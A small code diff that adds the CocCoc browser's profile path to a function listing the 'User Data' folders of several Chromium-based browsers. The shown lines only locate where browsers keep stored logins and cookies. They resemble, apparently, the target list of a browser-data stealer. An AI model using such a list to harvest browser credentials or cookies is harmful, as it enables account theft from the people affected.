@@ -354,7 +354,8 @@ def Chromium():
         'Uran': local + '\\uCozMedia\\Uran\\User Data',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
-        'Iridium': local + '\\Iridium\\User Data'
+        'Iridium': local + '\\Iridium\\User Data',
+        'CocCoc': local + '\\CocCoc\\Browser\\User Data'
     }
 
     blink_directory = {
